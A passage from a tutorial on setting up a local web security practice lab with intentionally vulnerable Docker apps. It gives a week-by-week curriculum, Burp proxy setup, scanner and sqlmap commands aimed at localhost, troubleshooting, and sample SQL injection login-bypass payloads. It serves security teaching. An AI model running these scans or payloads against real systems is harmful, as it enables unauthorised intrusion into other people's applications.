  ∙ SQLMap against custom app

Week 2: XSS (Cross-Site Scripting)
  ∙ DVWA XSS (Reflected, Stored, DOM)
  ∙ Juice Shop XSS challenges
  ∙ bWAPP XSS scenarios
  ∙ Build and test filter bypasses

Week 3: Authentication & Access Control
  ∙ Juice Shop auth challenges
  ∙ WebGoat auth bypass lessons
  ∙ crAPI BOLA/IDOR attacks
  ∙ JWT attacks on WebGoat

Week 4: API Security
  ∙ crAPI full walkthrough
  ∙ VAmPI all endpoints
  ∙ DVGA GraphQL attacks
  ∙ API enumeration with ffuf/Arjun

Week 5: File Upload & LFI/RFI
  ∙ DVWA file upload bypass
  ∙ DVWA LFI exploitation
  ∙ bWAPP file inclusion
  ∙ Log poisoning to RCE

Week 6: Command Injection & SSRF
  ∙ DVWA command injection
  ∙ Juice Shop SSRF
  ∙ Custom app SSRF to cloud metadata
  ∙ Filter bypass techniques

Week 7: Real CVEs
  ∙ Shellshock exploitation
  ∙ Log4Shell full chain
  ∙ Spring4Shell RCE
  ∙ Vulhub additional CVEs

Week 8: CMS Exploitation
  ∙ WordPress enumeration + exploit
  ∙ Joomla scanning + attack
  ∙ Drupal vulnerability testing
  ∙ Full pentest report writing
```

#### Configure Burp Suite Proxy

```bash [Terminal]
# ─── CONFIGURE BROWSER ───
# Firefox → Settings → Network → Manual Proxy
# HTTP Proxy: 127.0.0.1    Port: 8080
# Check: Also use this proxy for HTTPS

# ─── INSTALL BURP CA ───
# Browse: http://burp
# Download CA certificate
# Firefox → Settings → Certificates → Import → Select burp-ca.crt
# Check: Trust for websites

# ─── SCOPE CONFIGURATION ───
# In Burp: Target → Scope → Add
# Add all lab URLs:
# localhost:8081  (DVWA)
# localhost:3000  (Juice Shop)
# localhost:8082  (WebGoat)
# ... etc.

# ─── RECOMMENDED SETTINGS ───
# Proxy → Options → Intercept → Disable (for browsing)
# Enable only when actively testing
# Logger++ extension → captures everything silently
```

#### Run Automated Scans

```bash [Terminal]
# ─── NUCLEI AGAINST ALL TARGETS ───
echo "http://localhost:8081
http://localhost:3000
http://localhost:8082
http://localhost:8083
http://localhost:8084
http://localhost:8090
http://localhost:8091
http://localhost:8092
http://localhost:8093
http://localhost:8094" > lab_targets.txt

nuclei -l lab_targets.txt -severity critical,high,medium \
  -o nuclei_results.txt

# ─── NIKTO SCAN ───
nikto -h http://localhost:8081 -o nikto_dvwa.html -Format html

# ─── DIRECTORY BRUTE FORCE ───
feroxbuster -u http://localhost:8081 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 50 -o ferox_dvwa.txt

# ─── SQLMAP SCAN ───
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=low" \
  --dbs --batch -o

# ─── WPSCAN (WordPress) ───
wpscan --url http://localhost:8090 \
  --enumerate ap,at,u,tt --plugins-detection aggressive
```

#### Document & Report

```text
For each vulnerability found, document:
─────────────────────────────────────────
1. Application & URL tested
2. Vulnerability type (OWASP category)
3. Difficulty level attempted
4. Payload used
5. Screenshots of exploitation
6. Impact assessment
7. Remediation notes
8. What you learned
9. Alternative approaches to try
10. Time spent
```

::

---

## Troubleshooting

::accordion
  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "Container won't start / port conflict"
  ---

  ```bash [Terminal]
  # Check what's using the port
  sudo lsof -i :8081
  sudo netstat -tulnp | grep 8081

  # Kill the process
  sudo kill -9 <PID>

  # Or change the port in docker-compose.yml
  # "8081:80" → "9081:80"

  # Check container logs for errors
  docker logs dvwa
  docker logs --tail 50 dvwa
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "Out of disk space"
  ---

  ```bash [Terminal]
  # Check Docker disk usage
  docker system df

  # Clean up everything unused
  docker system prune -a -f --volumes

  # Remove specific images
  docker rmi $(docker images -q --filter "dangling=true")

  # Remove stopped containers
  docker container prune -f

  # Check host disk space
  df -h
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "Container can't reach another container"
  ---

  ```bash [Terminal]
  # Verify both containers are on the same network
  docker network inspect web-security-lab

  # Ping between containers
  docker exec dvwa ping -c 3 juice-shop

  # Check container IP
  docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' dvwa

  # Restart networking
  docker compose down
  docker compose up -d
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "DVWA database not initialized"
  ---

  ```bash [Terminal]
  # Access DVWA
  # http://localhost:8081/setup.php
  # Click "Create / Reset Database"

  # If it fails, check MySQL inside container
  docker exec -it dvwa bash
  mysql -u root -p  # password is usually blank or 'root'
  SHOW DATABASES;

  # Reset DVWA completely
  docker rm -f dvwa
  docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "Low performance / slow containers"
  ---

  ```bash [Terminal]
  # Check resource usage
  docker stats --no-stream

  # Increase Docker resources (Docker Desktop)
  # Settings → Resources → increase CPU/RAM

  # Run fewer containers
  docker compose up -d dvwa juice-shop webgoat  # Only what you need

  # Use lighter alternatives
  # bWAPP instead of full CMS stacks
  # VAmPI instead of crAPI (lighter)
  ```
  :::
::

---

## Quick Start — Lab in 5 Minutes

::tip
The absolute **fastest** way to get a working web security lab. Copy, paste, hack.
::

::steps{level="4"}

#### Install Docker (1 minute)

```bash [Terminal]
# Linux (Ubuntu/Debian/Kali)
sudo apt update && sudo apt install -y docker.io docker-compose
sudo systemctl start docker
sudo usermod -aG docker $USER && newgrp docker
```

#### Deploy 3 Essential Apps (2 minutes)

```bash [Terminal]
# DVWA — Classic web vulns
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa

# Juice Shop — Modern web app
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

# WebGoat — Guided learning
docker run -d -p 8082:8080 --name webgoat webgoat/webgoat
```

#### Access & Start Hacking (2 minutes)

```bash [Terminal]
# DVWA: http://localhost:8081
# Login: admin / password → Create Database → Set security=Low
# Try: SQL Injection → Enter: ' OR 1=1#

# Juice Shop: http://localhost:3000
# Try: Login → Email: ' OR 1=1-- / Password: anything

# WebGoat: http://localhost:8082/WebGoat
# Register account → Start lessons

# 🎉 YOU'RE HACKING! Your lab is ready.
```

::

---

::caution
**Important Reminders:**
- **NEVER** expose these Docker containers to the internet
- These apps are **intentionally vulnerable** — treat them as hostile
- **Do not** use production passwords or data in your lab
- **Stop** containers when not in use: `docker compose stop`
- **Only** practice on systems you own or have explicit permission to test
::